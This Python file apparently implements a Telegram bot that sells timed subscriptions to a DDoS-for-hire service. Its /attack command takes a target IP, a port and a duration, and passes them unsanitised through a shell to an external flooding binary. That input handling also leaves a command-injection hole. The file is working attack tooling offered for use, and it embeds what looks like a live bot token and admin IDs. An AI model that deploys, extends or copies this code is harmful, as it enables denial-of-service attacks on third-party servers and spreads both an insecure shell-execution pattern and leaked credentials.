import telebot
import subprocess
import datetime
import os
import time
# Insert your Telegram bot token here
bot = telebot.TeleBot('7470021130:AAGu76xnACyGUJiQrrTm5VuAqcfFe5jmVaY')
# DEVELOPER --> @LostBoiXD
# Admin user IDs
admin_id = ["6882674372"]

# File to store allowed user IDs and their subscription expiry
USER_FILE = "users.txt"
SUBSCRIPTION_FILE = "subscriptions.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Define subscription periods in seconds
subscription_periods = {
    '1min': 60,
    '1hour': 3600,
    '6hours': 21600,
    '12hours': 43200,
    '1day': 86400,
    '3days': 259200,
    '7days': 604800,
    '1month': 2592000,
    '2months': 5184000
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []
 
# Function to read subscriptions from the file
def read_subscriptions():
    subscriptions = {}
    try:
        with open(SUBSCRIPTION_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                parts = line.split()
                if len(parts) >= 2:
                    user_id = parts[0]
                    expiry_str = " ".join(parts[1:])
                    try:
                        expiry = datetime.datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
                        subscriptions[user_id] = expiry
                    except ValueError:
                        print(f"Error parsing date for user {user_id}: {expiry_str}")
                else:
                    print(f"Invalid line in subscription file: {line}")
    except FileNotFoundError:
        pass
    return subscriptions

# Function to write subscriptions to the file
def write_subscriptions(subscriptions):
    with open(SUBSCRIPTION_FILE, "w") as file:
        for user_id, expiry in subscriptions.items():
            file.write(f"{user_id} {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n")
# S4 OFFICIAL GRP. JOIN TO MORE UPDATES 
# List to store allowed user IDs
allowed_user_ids = read_users()
subscriptions = read_subscriptions()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found."
            else:
                file.truncate(0)
                response = "Logs cleared successfully."
    except FileNotFoundError:
        response = "No logs found to clear."
    return response
 
# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to check if a user is subscribed
def is_subscribed(user_id):
    if user_id in subscriptions:
        if datetime.datetime.now() < subscriptions[user_id]:
            return True
        else:
            del subscriptions[user_id]
            write_subscriptions(subscriptions)
    return False

# Function to add or update a user's subscription
def add_subscription(user_id, duration):
    expiry = datetime.datetime.now() + datetime.timedelta(seconds=duration)
    subscriptions[user_id] = expiry
    write_subscriptions(subscriptions)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            period = command[2]
            if period in subscription_periods:
                duration = subscription_periods[period]
                if user_to_add not in allowed_user_ids:
                    allowed_user_ids.append(user_to_add)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_to_add}\n")
                add_subscription(user_to_add, duration)
                response = f"User {user_to_add} added with {period} subscription successfully 🎉"
            else:
                response = "Invalid subscription period. Use: 1min, 1hour, 6hours, 12hours, 1day, 3days, 7days, 1month, or 2months."
        else:
            response = "Please specify a User ID and subscription period to add."
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."

    bot.reply_to(message, response)

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                if user_to_remove in subscriptions:
                    del subscriptions[user_to_remove]
                    write_subscriptions(subscriptions)
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list."
        else:
            response = "𝐏𝐥𝐞𝐚𝐬𝐞 𝐬𝐩𝐞𝐜𝐢𝐟𝐲 𝐚 𝐔𝐬𝐞𝐫 𝐈𝐃 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞."
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = clear_logs()
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            expiry = subscriptions.get(user_id, "No subscription")
                            response += f"- @{username} (ID: {user_id}) | Expires: {expiry}\n"
                        except Exception as e:
                            response += f"- User ID: {user_id} | Expires: {subscriptions.get(user_id, 'No subscription')}\n"
                else:
                    response = "No data found."
        except FileNotFoundError:
            response = "No data found."
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
        bot.reply_to(message, response)

# /attack command with countdown update
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:
            target, port, attack_time = command[1], int(command[2]), int(command[3])

            if attack_time > 240:
                bot.reply_to(message, "⛔ Maximum time allowed is 240 seconds.")
                return

            # Send initial attack message
            sent_message = bot.send_message(
                message.chat.id,
                f"🎯 Attack Started on `{target}`\n"
                f"🔌 Port: `{port}`\n"
                f"⏳ Duration: `{attack_time}` seconds\n"
                f"🚀 Attack in Progress...",
                parse_mode='Markdown'
            )

            # Update message every 1 seconds
            while attack_time > 0:
                time.sleep(1)
                attack_time -= 1
                if attack_time > 0:
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=sent_message.message_id,
                        text=f"🎯 Attack on `{target}`\n"
                             f"⏳ Time Remaining: `{attack_time}` seconds\n"
                             f"🚀 Attack in Progress...",
                        parse_mode='Markdown'
                    )

            # Change message to "Attack Finished"
            bot.edit_message_text(
                chat_id=message.chat.id,
                message_id=sent_message.message_id,
                text=f"✅ **Attack Finished**\n🎯 Target: `{target}`\n"
                     f"🔌 Port: `{port}`",
                parse_mode='Markdown'
            )

            # Execute attack command
            full_command = f"./pushpa {target} {port} {attack_time} 800"
            subprocess.run(full_command, shell=True)

# Add /mylogs command to display logs recorded for bgmi and website commands


@bot.message_handler(commands=['plan'])
def show_plan(message):
   # response = "Our plans:\n"
    #response += "- Basic Plan: $10/month\n"
   # response += "- Pro Plan: $20/month\n"
    #response += "- Premium Plan: $30/month\n"
    response = "- 𝐃𝐌 𝐌𝐄 -- @LASTWISHES0\n"

    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def show_rules(message):
    response = "Rules:\n"
    response += "𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐚𝐫𝐞 𝐥𝐢𝐦𝐢𝐭𝐞𝐝 𝐭𝐨 𝐚𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝 𝐭𝐚𝐫𝐠𝐞𝐭𝐬 𝐨𝐧𝐥𝐲.\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids and is_subscribed(user_id):
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your command logs:\n" + "".join(user_logs)
                else:
                    response = "No command logs found for you."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "𝐔𝐧𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 𝐓𝐨 𝐔𝐬𝐞 𝐏𝐥𝐞𝐚𝐬𝐞 𝐃𝐌 𝐭𝐨 𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑"
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def show_admin_commands(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        response = "Admin commands:\n"
        response += "/allusers - List all authorized users\n"
        response += "/clearlogs - Clear all command logs\n"
        response += "/remove <user_id> - Remove a user\n"
        bot.reply_to(message, response)
    else:
        response = "𝐁𝐎𝐓 𝐅𝐀𝐓𝐇𝐄𝐑 𝐂𝐀𝐍 𝐃𝐎 𝐓𝐇𝐈𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃."
        bot.reply_to(message, response)

@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐘𝐨𝐮𝐫 𝐓𝐞𝐥𝐞𝐠𝐫𝐚𝐦 𝐈𝐃: `{user_id}`"
    bot.reply_to(message, response, parse_mode='Markdown')
 


@bot.message_handler(commands=['canary'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"𝐂A𝐍𝐀𝐑𝐘 𝐀𝐏𝐊 --> https://t.me/APNA_BHAI_DILDOS/75"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['LAST'])
def show_help(message):
    response = """𝐈 𝐊𝐍𝐎𝐖 𝐘𝐎𝐔 𝐂𝐎𝐌𝐌𝐀𝐍𝐃 𝐈𝐒 - Lost \n𝐁𝐔𝐓 𝐇𝐈𝐒 𝐁𝐎𝐓𝐒 𝐅𝐀𝐓𝐇𝐄𝐑 @LASTWISHES0 \n𝐎𝐖𝐍𝐄𝐑 𝐎𝐅  @ddosserverfreeze.
"""
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('Updates', url='@LASTWISHES0')
    )

    bot.reply_to(message, response, parse_mode='Markdown', reply_markup=keyboard)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'𝐇𝐄𝐘 👋 {user_name}!\n\n'
    response += '𝐓𝐡𝐢𝐬 𝐛𝐨𝐭 𝐚𝐥𝐥𝐨𝐰𝐬 𝐲𝐨𝐮 𝐭𝐨 𝐩𝐞𝐫𝐟𝐨𝐫𝐦 𝐚𝐭𝐭𝐚𝐜𝐤𝐬\n\n'
    response += '/id :--> 🅶🅴🆃 🆈🅾🆄 🆃🅴🅻🅴. 🅸🅳\n'
    response += '/help :--> 𝐊𝐧𝐨𝐰 𝐨𝐭𝐡𝐞𝐫 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬\n'
    response += '/attack :--> 𝐋𝐚𝐮𝐧𝐜𝐡 𝐚𝐧 𝐚𝐭𝐭𝐚𝐜𝐤\n'
    response += '/mylogs :--> 𝐕𝐢𝐞𝐰 𝐫𝐞𝐜𝐞𝐧𝐭 𝐚𝐭𝐭𝐚𝐜𝐤𝐬\n'
    response += '/plan :--> 𝐕𝐢𝐞𝐰 𝐩𝐫𝐢𝐜𝐞𝐬 𝐭𝐨 𝐩𝐞𝐫𝐬𝐨𝐧𝐚𝐥\n'
    response += '/canary :--> 𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃 𝐂𝐀𝐍𝐀𝐑𝐘 𝐀𝐏𝐊\n'
    response += '/admincmd :--> 𝐕𝐢𝐞𝐰 𝐚𝐝𝐦𝐢𝐧 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬\n\n'
    response += '𝐅𝐨𝐫 𝐡𝐞𝐥𝐩 𝐚𝐧𝐝 𝐮𝐩𝐝𝐚𝐭𝐞𝐬 𝐜𝐥𝐢𝐜𝐤 𝐛𝐞𝐥𝐨𝐰 𝐛𝐮𝐭𝐭𝐨𝐧𝐬\n'
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.row(
        telebot.types.InlineKeyboardButton('UPDATES', url='@LASTWISHES0')
    )

    bot.reply_to(message, response, reply_markup=keyboard)

# Start the bot
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
